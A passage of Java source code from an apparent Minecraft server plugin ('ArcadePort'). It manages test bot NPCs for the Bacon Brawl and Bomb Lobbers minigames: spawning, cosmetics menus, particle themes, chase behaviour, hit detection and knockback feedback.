            case "kit"->{if(args.length<3){sender.sendMessage(ChatColor.YELLOW+"/arcadeport bot kit <name> <kit-id>");return;}Bot b=bots.get(key(args[1]));if(b==null){sender.sendMessage(ChatColor.RED+"No bot named "+args[1]+".");return;}String kit=ArcadePortRules.normalizeBaconBrawlKit(args[2]);if(kit==null){sender.sendMessage(ChatColor.YELLOW+"Bacon Brawl bot kits: el-muchacho-pigo, mama-piggles, pig (Pig Cloak), brutus-bacon.");return;}b.kit=kit;b.form=ArcadePortRules.baconBrawlUsesSheepAvatar(kit)?"pink-sheep":"pig";saveBot(b);replaceBotEntity(b);sender.sendMessage(ChatColor.GREEN+"Updated "+b.name+"'s kit to "+kit+".");}
            default->sender.sendMessage(ChatColor.YELLOW+"/arcadeport bot <summon|remove|clear|list|cosmetics|form|kit> ...");
        }
    }

    private Bot createBot(String name){String k=key(name);if(k.isBlank()||bots.containsKey(k))return null;Bot b=new Bot(k,name,"porky","pig","el-muchacho-pigo");bots.put(k,b);saveBot(b);spawnBotEntity(b,lobby.spawnLocation().add(bots.size()*1.6D-3.0D,-3.0D,8.0D),false);refreshDisplays();return b;}
    private String key(String n){return n==null?"":n.toLowerCase(Locale.ROOT).trim().replaceAll("[^a-z0-9_-]","-");}
    private boolean removeBot(String n){Bot b=bots.remove(key(n));if(b==null)return false;if(b.actor!=null&&b.actor.isValid())b.actor.remove();plugin.getConfig().set("test-bots."+b.key,null);plugin.saveConfig();refreshDisplays();return true;}
    private void saveBot(Bot b){String p="test-bots."+b.key+".";plugin.getConfig().set(p+"name",b.name);plugin.getConfig().set(p+"theme",b.theme);plugin.getConfig().set(p+"form",b.form);plugin.getConfig().set(p+"kit",b.kit);plugin.saveConfig();}
    private void replaceBotEntity(Bot b){if(b.actor!=null&&b.actor.isValid())b.actor.remove();Location at=b.actorLocation==null||b.actorLocation.getWorld()!=lobby.ensureWorld()?lobby.spawnLocation().add(0,-3,8):b.actorLocation.clone();spawnBotEntity(b,at,b.inGame&&b.deployedGame!=null&&manager.isActiveGame(at.getWorld(),b.deployedGame));}
    private void spawnBotEntity(Bot b, Location at, boolean inGame) {
        if (at == null || at.getWorld() == null) return;
        LivingEntity actor;
        if (inGame && b.deployedGame == ArcadePortGame.BOMB_LOBBERS) {
            Zombie zombie = at.getWorld().spawn(at, Zombie.class);
            zombie.setBaby(false);
            zombie.setCanPickupItems(false);
            actor = zombie;
            equipBombLobbersBot(zombie, b.team);
        } else if ("pink-sheep".equals(b.form)) {
            Sheep sheep = at.getWorld().spawn(at, Sheep.class);
            sheep.setColor(DyeColor.PINK);
            actor = sheep;
        } else {
            actor = at.getWorld().spawn(at, Pig.class);
        }
        // NPCs stay damageable so Bukkit emits EntityDamageByEntityEvent; this listener
        // cancels vanilla damage and applies the correct game's test-dummy response.
        actor.setInvulnerable(false);
        actor.setRemoveWhenFarAway(false);
        actor.setPersistent(false);
        actor.setSilent(true);
        actor.setCustomNameVisible(true);
        actor.setCollidable(false);
        actor.getPersistentDataContainer().set(botKey, PersistentDataType.STRING, b.key);
        actor.getPersistentDataContainer().set(themeKey, PersistentDataType.STRING, b.theme);
        actor.getPersistentDataContainer().set(formKey, PersistentDataType.STRING, b.form);
        if (actor instanceof Mob mob) mob.setAI(false);
        b.actor = actor;
        b.actorLocation = at.clone();
        b.inGame = inGame;
        b.arenaSpawn = at.clone();
        refreshBotAppearance(b);
    }

    private void equipBombLobbersBot(Zombie zombie, int team) {
        var equipment = zombie.getEquipment();
        if (equipment == null) return;
        Color teamColor = team == 1 ? Color.AQUA : Color.RED;
        equipment.setHelmet(new ItemStack(Material.PLAYER_HEAD));
        equipment.setChestplate(dyedBombLobbersArmour(Material.LEATHER_CHESTPLATE, teamColor));
        equipment.setLeggings(dyedBombLobbersArmour(Material.LEATHER_LEGGINGS, teamColor));
        equipment.setBoots(dyedBombLobbersArmour(Material.LEATHER_BOOTS, teamColor));
    }

    private ItemStack dyedBombLobbersArmour(Material material, Color color) {
        ItemStack item = new ItemStack(material);
        if (item.getItemMeta() instanceof LeatherArmorMeta meta) {
            meta.setColor(color);
            item.setItemMeta(meta);
        }
        return item;
    }

    private void refreshBotAppearance(Bot b) {
        if (b.actor == null || !b.actor.isValid()) return;
        if (b.actor instanceof Sheep sheep) sheep.setColor(DyeColor.PINK);
        if (b.actor instanceof Zombie zombie) equipBombLobbersBot(zombie, b.team);
        if (b.actor instanceof LivingEntity living) living.setCollidable(false);
        b.actor.setInvulnerable(false);
        String name = ChatColor.GOLD + b.name + ChatColor.GRAY + " [" + pretty(b.theme) + "]";
        if (b.inGame && b.deployedGame == ArcadePortGame.BOMB_LOBBERS) {
            ChatColor teamColor = b.team == 1 ? ChatColor.AQUA : ChatColor.RED;
            name = teamColor + b.name + ChatColor.GRAY + (b.team == 1 ? " [BLUE BOT]" : " [RED BOT]");
        }
        b.actor.setCustomName(name);
        b.actor.setCustomNameVisible(true);
        b.actor.getPersistentDataContainer().set(themeKey, PersistentDataType.STRING, b.theme);
        b.actor.getPersistentDataContainer().set(formKey, PersistentDataType.STRING, b.form);
        b.actor.getPersistentDataContainer().set(botKey, PersistentDataType.STRING, b.key);
    }
    private void openBotCosmetics(Player p,Bot b){
        Inventory inv=Bukkit.createInventory(null,27,BOT_MENU_PREFIX+b.key);int[] slots={10,11,12,13,14,15};
        for(int i=0;i<THEMES.length;i++){String theme=THEMES[i];ItemStack it=item(themeMaterial(theme),(b.theme.equals(theme)?ChatColor.GREEN+"✓ ":ChatColor.WHITE)+pretty(theme),ChatColor.GRAY+"Theme particle preview",b.theme.equals(theme)?ChatColor.GREEN+"Selected":ChatColor.YELLOW+"Click to equip");mark(it,"theme:"+theme,b.key);inv.setItem(slots[i],it);}
        ItemStack form=item(Material.SHEARS,ChatColor.AQUA+"Toggle Bot Form",ChatColor.GRAY+"Current: "+b.form,ChatColor.YELLOW+"Switch Pig / Pink Sheep");mark(form,"form:"+("pig".equals(b.form)?"pink-sheep":"pig"),b.key);inv.setItem(22,form);
        ItemStack close=item(Material.RED_BED,ChatColor.RED+"Close");mark(close,"bot-close",b.key);inv.setItem(26,close);p.openInventory(inv);
    }
    private Material themeMaterial(String theme){return switch(theme){case "inferno"->Material.FIRE_CHARGE;case "frost"->Material.SNOWBALL;case "slime"->Material.SLIME_BALL;case "royal"->Material.GOLDEN_APPLE;case "confetti"->Material.FIREWORK_ROCKET;default->Material.PORKCHOP;};}
    private String pretty(String value){StringBuilder out=new StringBuilder();for(String part:value.split("-")){if(part.isEmpty())continue;if(out.length()>0)out.append(' ');out.append(Character.toUpperCase(part.charAt(0))).append(part.substring(1));}return out.toString();}

    private void tick(){
        refreshDisplays();World world=lobby.ensureWorld();
        for (Entity e : new ArrayList<>(showcase)) {
            if (e == null || !e.isValid() || e.getWorld() != world) continue;
            String value = e.getPersistentDataContainer().get(themeKey, PersistentDataType.STRING);
            if (value == null || !value.startsWith("showcase:")) continue;
            String theme = value.substring("showcase:".length());
            e.getWorld().spawnParticle(particle(theme), e.getLocation().add(0, 1, 0), 3, 0.2, 0.3, 0.2, 0.01);
        }
        long now=System.currentTimeMillis();for(Bot b:bots.values())tickBot(b,now,world);
    }
    private void tickBot(Bot b,long now,World lobbyWorld){
        Entity e=b.actor;if(!(e instanceof LivingEntity actor)||!e.isValid()){Location at=b.actorLocation==null?lobby.spawnLocation().add(0,-3,8):b.actorLocation.clone();spawnBotEntity(b,at,b.inGame);return;}
        // Re-assert collisionless, non-AI target state every tick; game logic drives movement/knockback.
        actor.setCollidable(false);
        if (actor instanceof Mob mob) mob.setAI(false);
        if(!b.inGame||b.deployedGame==null||!manager.isActiveGame(e.getWorld(),b.deployedGame)){
            if(e.getWorld()!=lobbyWorld&&b.inGame)returnBotsToLobby();
            return;
        }
        if(b.deployedGame!=ArcadePortGame.BACON_BRAWL){
            e.getWorld().spawnParticle(particle(b.theme),e.getLocation().add(0,1,0),2,0.2,0.2,0.2,0.01);
            return;
        }
        // Let a landed hit's knockback play through instead of having the NPC chase loop
        // overwrite its velocity on the next scheduler tick.
        if (now < b.knockbackUntil) {
            e.getWorld().spawnParticle(particle(b.theme),e.getLocation().add(0,1,0),2,0.2,0.2,0.2,0.01);
            return;
        }
        List<Player> targets=manager.botTargets(e.getWorld(),b.deployedGame);Player nearest=null;double distance=Double.POSITIVE_INFINITY;
        for(Player p:targets){double d=p.getLocation().distanceSquared(e.getLocation());if(d<distance){distance=d;nearest=p;}}
        if(nearest==null)return;
        if(e.getLocation().getY()<e.getWorld().getMinHeight()+8){if(b.arenaSpawn!=null)actor.teleport(b.arenaSpawn);return;}
        if(distance>4){Vector v=nearest.getLocation().toVector().subtract(e.getLocation().toVector()).setY(0);if(v.lengthSquared()>0.01){v.normalize().multiply(0.22);v.setY(actor.isOnGround()?0.15:actor.getVelocity().getY());actor.setVelocity(v);}}
        else if (now >= b.nextAttackAt) {
            boolean landed = manager.applyBaconBrawlBotAttack(e.getLocation(), nearest);
            if (landed) {
                nearest.getWorld().spawnParticle(particle(b.theme),
                        nearest.getLocation().add(0, 1, 0), 8, 0.4, 0.3, 0.4, 0.01);
            }
            b.nextAttackAt = now + 1400L;
        }
        e.getWorld().spawnParticle(particle(b.theme),e.getLocation().add(0,1,0),2,0.2,0.2,0.2,0.01);
    }
    private Particle particle(String theme) {
        String value = theme == null ? "" : theme.toLowerCase(Locale.ROOT);
        if (value.contains("ember") || value.contains("inferno") || value.contains("flame")
                || value.contains("dragon-roar") || value.contains("molten")) return Particle.FLAME;
        if (value.contains("frost") || value.contains("snow") || value.contains("ice")) return Particle.SNOWFLAKE;
        if (value.contains("slime")) return Particle.CRIT;
        if (value.contains("royal") || value.contains("lantern") || value.contains("sky-compass")
                || value.contains("oath")) return Particle.END_ROD;
        if (value.contains("confetti") || value.contains("wool") || value.contains("nature")
                || value.contains("bloom")) return Particle.HAPPY_VILLAGER;
        if (value.contains("spark") || value.contains("wing") || value.contains("fletching")
                || value.contains("starburst")) return Particle.FIREWORK;
        if (value.contains("shockwave") || value.contains("target") || value.contains("bullseye")
                || value.contains("turf-crack")) return Particle.DAMAGE_INDICATOR;
        if (value.contains("soul") || value.contains("void")) return Particle.SOUL;
        if (value.contains("paint") || value.contains("splatter") || value.contains("colourburst")
                || value.contains("stencil")) return Particle.SPLASH;
        if (value.contains("bark") || value.contains("footprint") || value.contains("chalk")
                || value.contains("red-walk") || value.contains("ribbon")) return Particle.COMPOSTER;
        if (value.contains("dragon-eye") || value.contains("ender")) return Particle.PORTAL;
        if (value.contains("cloud")) return Particle.CLOUD;
        if (value.contains("prism") || value.contains("shatter") || value.contains("pixel-crater")) return Particle.CRIT;
        if (value.contains("warning") || value.contains("turtle") || value.contains("pips")) return Particle.ELECTRIC_SPARK;
        if (value.contains("sheep") || value.contains("shepherd")) return Particle.ITEM;
        if (value.contains("arena") || value.contains("red-sand")) return Particle.CRIT;
        return Particle.CRIT;
    }

    List<LivingEntity> botTargets(World world, ArcadePortGame game) {
        List<LivingEntity> targets = new ArrayList<>();
        if (world == null || game == null) return targets;
        for (Bot bot : bots.values()) {
            if (!bot.inGame || bot.deployedGame != game || bot.actor == null
                    || !bot.actor.isValid() || bot.actor.getWorld() != world
                    || !(bot.actor instanceof LivingEntity living)) continue;
            targets.add(living);
        }
        return targets;
    }

    public void deployBots(ArcadePortGame game, List<Location> spawns) {
        deployBots(game, spawns, -1);
    }

    public void deployBots(ArcadePortGame game, List<Location> spawns, int bombLobbersTeam) {
        if (game == null || spawns == null || spawns.isEmpty()) {
            returnBotsToLobby();
            return;
        }
        int index = 0;
        for (Bot bot : bots.values()) {
            Location target = spawns.get(index % spawns.size()).clone();
            if (game != ArcadePortGame.BOMB_LOBBERS) {
                target.add(index % 2 == 0 ? 3 : -3, 0, index % 3 == 0 ? 2 : -2);
            }
            index++;
            bot.inGame = true;
            bot.deployedGame = game;
            bot.team = game == ArcadePortGame.BOMB_LOBBERS ? bombLobbersTeam : -1;
            boolean correctEntity = game == ArcadePortGame.BOMB_LOBBERS
                    ? bot.actor instanceof Zombie : !(bot.actor instanceof Zombie);
            if (bot.actor == null || !bot.actor.isValid() || !correctEntity) {
                if (bot.actor != null && bot.actor.isValid()) bot.actor.remove();
                spawnBotEntity(bot, target, true);
            } else {
                bot.actor.teleport(target);
            }
            bot.arenaSpawn = target.clone();
            bot.actorLocation = target.clone();
            refreshBotAppearance(bot);
        }
    }

    public void returnBotsToLobby() {
        Location base = lobby.spawnLocation();
        if (base == null) return;
        int index = 0;
        for (Bot bot : bots.values()) {
            Location home = base.clone().add(index++ * 1.6D - 3, -3, 8);
            boolean needsLobbyForm = bot.actor == null || !bot.actor.isValid()
                    || bot.actor instanceof Zombie;
            bot.inGame = false;
            bot.deployedGame = null;
            bot.team = -1;
            if (needsLobbyForm) {
                if (bot.actor != null && bot.actor.isValid()) bot.actor.remove();
                spawnBotEntity(bot, home, false);
            } else {
                bot.actor.teleport(home);
                bot.actor.setVelocity(new Vector());
                if (bot.actor instanceof Mob mob) mob.setAI(false);
            }
            bot.actorLocation = home.clone();
            bot.arenaSpawn = null;
            refreshBotAppearance(bot);
        }
    }
    @EventHandler(priority=EventPriority.HIGHEST,ignoreCancelled=false)
    public void onBotDamage(EntityDamageEvent e){
        Entity entity=e.getEntity();String key=entity.getPersistentDataContainer().get(botKey,PersistentDataType.STRING);
        if(key==null){
            String tag=entity.getPersistentDataContainer().get(themeKey,PersistentDataType.STRING);
            if(entity.getPersistentDataContainer().has(kitNpcKey,PersistentDataType.STRING)
                    ||entity.getPersistentDataContainer().has(teamNpcKey,PersistentDataType.STRING)
                    ||(tag!=null&&(tag.startsWith("showcase:")||"showcase-label".equals(tag))))e.setCancelled(true);
            return;
        }
        e.setCancelled(true);
        if(!(entity instanceof LivingEntity actor)||!(e instanceof EntityDamageByEntityEvent be)
                ||!(be.getDamager() instanceof Player attacker))return;
        Bot b=bots.get(key);
        if(b==null||!b.inGame||b.deployedGame==null
                ||!manager.isActiveGame(entity.getWorld(),b.deployedGame))return;
        if (b.deployedGame == ArcadePortGame.BOMB_LOBBERS) {
            ItemStack held = attacker.getInventory().getItemInMainHand();
            if (manager.wasRecentBombLobbersThrow(attacker)
                    || (held != null && (held.getType() == Material.TNT || held.getType() == Material.LEVER))) {
                // TNT/kit interactions are handled by the projectile and ability paths.
                return;
            }
            applyBombLobbersBotMeleeHit(b, actor, attacker);
            return;
        }
        if (b.deployedGame == ArcadePortGame.BACON_BRAWL) {
            applyBotHit(b, actor, attacker, e.getDamage());
        } else {
            showBotImpact(b, actor, attacker, ChatColor.YELLOW + "HIT!", ChatColor.GREEN + "Hit bot " + b.name);
        }
    }
    /** Fallback for clients/plugins that suppress the normal entity-damage event for NPC targets. */
    @EventHandler(priority=EventPriority.MONITOR,ignoreCancelled=false)
    public void onBotAttackSwing(PlayerAnimationEvent event) {
        if (!"ARM_SWING".equals(event.getAnimationType().name())) return;
        registerBotHitFromSwing(event.getPlayer());
    }

    @EventHandler(priority=EventPriority.MONITOR,ignoreCancelled=false)
    public void onBotLeftClick(PlayerInteractEvent event) {
        if (event.getAction() != Action.LEFT_CLICK_AIR && event.getAction() != Action.LEFT_CLICK_BLOCK) return;
        registerBotHitFromSwing(event.getPlayer());
    }

    private void registerBotHitFromSwing(Player attacker) {
        if (attacker == null || !attacker.isOnline()) return;
        boolean baconMatch = manager.isActiveGame(attacker.getWorld(), ArcadePortGame.BACON_BRAWL);
        boolean bombLobbersMatch = manager.isActiveGame(attacker.getWorld(), ArcadePortGame.BOMB_LOBBERS);
        if (!baconMatch && !bombLobbersMatch) return;
        if (bombLobbersMatch) {
            ItemStack held = attacker.getInventory().getItemInMainHand();
            if (held != null && (held.getType() == Material.TNT || held.getType() == Material.LEVER)) return;
        }
        long now = System.currentTimeMillis();
        java.util.UUID id = attacker.getUniqueId();
        if (now - lastBotSwingAtByAttacker.getOrDefault(id, 0L) < 100L
                || now - lastBotHitAtByAttacker.getOrDefault(id, 0L) < 180L) return;

        Location eye = attacker.getEyeLocation();
        Vector direction = eye.getDirection().normalize();
        LivingEntity actor = null;
        var ray = attacker.getWorld().rayTraceEntities(eye, direction, 4.25D, 0.9D,
                candidate -> candidate instanceof LivingEntity
                        && candidate.getPersistentDataContainer().has(botKey, PersistentDataType.STRING));
        if (ray != null && ray.getHitEntity() instanceof LivingEntity hit
                && attacker.hasLineOfSight(hit)) actor = hit;

        if (actor == null) {
            double bestAlong = Double.POSITIVE_INFINITY;
            for (Entity candidate : attacker.getWorld().getNearbyEntities(
                    eye, 4.25D, 4.25D, 4.25D,
                    entity -> entity instanceof LivingEntity
                            && entity.getPersistentDataContainer().has(botKey, PersistentDataType.STRING))) {
                if (!(candidate instanceof LivingEntity living) || !attacker.hasLineOfSight(candidate)) continue;
                Vector delta = living.getBoundingBox().getCenter().subtract(eye.toVector());
                double along = delta.dot(direction);
                if (along < 0.0D || along > 4.25D || along >= bestAlong) continue;
                Vector nearest = eye.toVector().add(direction.clone().multiply(along));
                if (living.getBoundingBox().getCenter().distanceSquared(nearest) <= 1.35D * 1.35D) {
                    actor = living;
                    bestAlong = along;
                }
            }
        }
        if (actor == null) return;
        String key = actor.getPersistentDataContainer().get(botKey, PersistentDataType.STRING);
        Bot bot = key == null ? null : bots.get(key);
        if (bot == null || actor.getWorld() != attacker.getWorld()) return;

        lastBotSwingAtByAttacker.put(id, now);
        LivingEntity target = actor;
        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            boolean stillBaconMatch = baconMatch
                    && manager.isActiveGame(target.getWorld(), ArcadePortGame.BACON_BRAWL);
            boolean stillBombLobbersMatch = bombLobbersMatch
                    && manager.isActiveGame(target.getWorld(), ArcadePortGame.BOMB_LOBBERS);
            if (!attacker.isOnline() || !target.isValid()
                    || target.getWorld() != attacker.getWorld()
                    || (!stillBaconMatch && !stillBombLobbersMatch)
                    || System.currentTimeMillis() - lastBotHitAtByAttacker.getOrDefault(id, 0L) < 250L
                    || attacker.getLocation().distanceSquared(target.getLocation()) > 20.25D
                    || !attacker.hasLineOfSight(target)) return;
            if (bot.deployedGame == ArcadePortGame.BOMB_LOBBERS && stillBombLobbersMatch) {
                applyBombLobbersBotMeleeHit(bot, target, attacker);
            } else if (bot.deployedGame == ArcadePortGame.BACON_BRAWL && stillBaconMatch) {
                applyBotHit(bot, target, attacker, 2.0D);
            }
        }, 1L);
    }

    private void applyBombLobbersBotMeleeHit(Bot bot, LivingEntity actor, Player attacker) {
        if (bot == null || actor == null || attacker == null
                || !manager.isBombLobbersEnemyBot(attacker, actor)) {
            if (attacker != null && attacker.isOnline()) {
                attacker.sendActionBar(ChatColor.RED + "That bot is on your team.");
            }
            return;
        }
        long now = System.currentTimeMillis();
        UUID attackerId = attacker.getUniqueId();
        if (now - lastBotHitAtByAttacker.getOrDefault(attackerId, 0L) < 180L) return;
        Vector away = actor.getLocation().toVector().subtract(attacker.getLocation().toVector()).setY(0.0D);
        if (away.lengthSquared() < 0.001D) away = attacker.getLocation().getDirection().setY(0.0D).multiply(-1.0D);
        if (away.lengthSquared() < 0.001D) away = new Vector(0.0D, 0.0D, 1.0D);
        actor.setNoDamageTicks(0);
        actor.setVelocity(away.normalize().multiply(0.72D).setY(0.32D));
        bot.knockbackUntil = now + 450L;
        lastBotHitAtByAttacker.put(attackerId, now);
        showBotImpact(bot, actor, attacker, ChatColor.YELLOW + "HIT!",
                ChatColor.GREEN + "Hit opposing Bomb Lobbers bot " + bot.name);
    }

    private void applyBotHit(Bot bot, LivingEntity actor, Player attacker, double rawDamage) {
        long now = System.currentTimeMillis();
        java.util.UUID attackerId = attacker.getUniqueId();
        // Bukkit damage and the arm-swing fallback can describe the same attack packet.
        if (now - lastBotHitAtByAttacker.getOrDefault(attackerId, 0L) < 180L) return;

        actor.setCollidable(false);
        actor.setNoDamageTicks(0);
        bot.knockbackUntil = now + 800L;
        ArcadePortManager.BaconBrawlBotHitResult hit =
                manager.applyBaconBrawlBotHit(attacker, actor, bot.name, bot.kit, rawDamage);
        if (hit.meter() < 0) return;
        lastBotHitAtByAttacker.put(attackerId, now);

        boolean critical = hit.timingMultiplier() >= 1.5D;
        String flashy = ChatColor.GOLD + "✦ " + ChatColor.YELLOW + ChatColor.BOLD
                + "FLASHY CRITICAL!" + ChatColor.GOLD + " ✦";
        if (critical) {
            attacker.sendActionBar(flashy + ChatColor.WHITE + "  Knockback x"
                    + String.format(Locale.ROOT, "%.2f", hit.timingMultiplier()));
            attacker.sendTitle("", flashy, 0, 18, 5);
            actor.getWorld().spawnParticle(Particle.FIREWORK, actor.getLocation().add(0, 1, 0),
                    18, 0.45, 0.5, 0.45, 0.06);
        }
        // Every hit has hurt animation, sound and impact particles; only critical hits get
        // the explicit flashy label, so normal/early/late hits aren't mislabeled as misses.
        showBotImpact(bot, actor, attacker, critical ? flashy : null, null);
    }

    private void showBotImpact(Bot bot, LivingEntity actor, Player attacker, String visibleLabel, String actionbar) {
        actor.setCollidable(false);
        actor.playEffect(EntityEffect.HURT);
        Location impact = actor.getLocation().clone().add(0, 1, 0);
        actor.getWorld().spawnParticle(Particle.CRIT, impact, 8, 0.28, 0.35, 0.28, 0.04);
        actor.getWorld().spawnParticle(particle(bot.theme), impact, 12, 0.4, 0.4, 0.4, 0.02);
        Sound hurt = actor instanceof Pig ? Sound.ENTITY_PIG_HURT
                : actor instanceof Sheep ? Sound.ENTITY_SHEEP_HURT
                : actor instanceof Zombie ? Sound.ENTITY_ZOMBIE_HURT : Sound.ENTITY_PLAYER_HURT;
        actor.getWorld().playSound(actor.getLocation(), hurt, 1.0F, 1.0F);
        if (attacker != null && attacker.isOnline() && actionbar != null && !actionbar.isBlank()) {
            attacker.sendActionBar(actionbar);
        }
        if (visibleLabel != null && !visibleLabel.isBlank()) {
            final ArmorStand label = actor.getWorld().spawn(actor.getLocation().clone().add(0, 1.8D, 0), ArmorStand.class);
            label.setVisible(false); label.setSmall(true); label.setGravity(false); label.setBasePlate(false);
            label.setArms(false); label.setMarker(true); label.setInvulnerable(true); label.setCanPickupItems(false);
            label.setCustomName(visibleLabel); label.setCustomNameVisible(true);
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                if (label.isValid() && !label.isDead()) label.remove();
            }, 16L);
        }
    }

    public boolean isBombLobbersEnemyBot(LivingEntity target, int attackingTeam) {
        if (target == null || !target.isValid()) return false;
        String botId = target.getPersistentDataContainer().get(botKey, PersistentDataType.STRING);
        Bot bot = botId == null ? null : bots.get(botId);
        return bot != null && bot.inGame && bot.deployedGame == ArcadePortGame.BOMB_LOBBERS
                && bot.team >= 0 && ArcadePortRules.areBombLobbersEnemies(attackingTeam, bot.team);
    }

    /** Called by the TNT sweep when a Bomb Lobbers test bot is struck directly. */
    public void showBombLobbersBotDirectHit(LivingEntity target, Player thrower, Location bombLocation) {
        showBombLobbersBotDirectHit(target, thrower, bombLocation, false);
    }

    public void showBombLobbersBotDirectHit(LivingEntity target, Player thrower,
            Location bombLocation, boolean fiery) {
        if (target == null || !target.isValid()) return;
        String key = target.getPersistentDataContainer().get(botKey,PersistentDataType.STRING);
        Bot bot = key == null ? null : bots.get(key);
        if (bot == null) return;
        Vector away = bombLocation == null ? target.getLocation().toVector()
                .subtract(thrower == null ? target.getLocation().clone().subtract(0,0,1).toVector() : thrower.getLocation().toVector())
                : target.getLocation().toVector().subtract(bombLocation.toVector());
        if (away.lengthSquared()<0.01D) away=new Vector(0,0,1);
        target.setVelocity(away.normalize().multiply(0.8D).setY(0.35D));
        if (fiery) target.setFireTicks(100);
        if (thrower != null && thrower.isOnline()) {
            showBotImpact(bot,target,thrower,ChatColor.GOLD+"DIRECT HIT!",
                    ChatColor.GREEN+"DIRECT HIT!"+ChatColor.GRAY+" | "+bot.name);
        } else {
            showBotImpact(bot,target,null,ChatColor.GOLD+"DIRECT HIT!", "");
        }
    }

    /** Apply a Bomb Lobbers blast impulse and impact feedback to an opposing test bot. */
    public void showBombLobbersBotBlastHit(LivingEntity target, Location blast, double impact) {
        showBombLobbersBotBlastHit(target, blast, impact, false);
    }

    public void showBombLobbersBotBlastHit(LivingEntity target, Location blast, double impact, boolean fiery) {
        if (target == null || !target.isValid() || blast == null
                || target.getWorld() != blast.getWorld() || impact <= 0.0D) return;
        String key = target.getPersistentDataContainer().get(botKey, PersistentDataType.STRING);
        Bot bot = key == null ? null : bots.get(key);
        if (bot == null || !bot.inGame || bot.deployedGame != ArcadePortGame.BOMB_LOBBERS || bot.team < 0) return;
        Vector away = target.getEyeLocation().toVector().subtract(blast.toVector());
        target.setVelocity(ArcadePortRules.bombLobbersExplosionVelocity(target.getVelocity(), away, impact));
        if (fiery) target.setFireTicks(100);
        showBotImpact(bot, target, null, null, null);
    }

    public void shutdown(){if(task!=null)task.cancel();returnBotsToLobby();for(Entity e:new ArrayList<>(showcase))if(e!=null&&e.isValid())e.remove();for(Entity e:new ArrayList<>(kitNpcs))if(e!=null&&e.isValid())e.remove();if(teamNpc!=null&&teamNpc.isValid())teamNpc.remove();}

    private final class Bot{
        final String key,name;String theme,form,kit;Entity actor;Location actorLocation,arenaSpawn;boolean inGame;ArcadePortGame deployedGame;int team=-1;long nextAttackAt,knockbackUntil;
        Bot(String key,String name,String theme,String form,String kit){this.key=key;this.name=name;this.theme=List.of(THEMES).contains(theme)?theme:"porky";this.form="pink-sheep".equals(form)?"pink-sheep":"pig";this.kit=ArcadePortRules.normalizeBaconBrawlKit(kit)==null?"el-muchacho-pigo":kit;}
    }
}
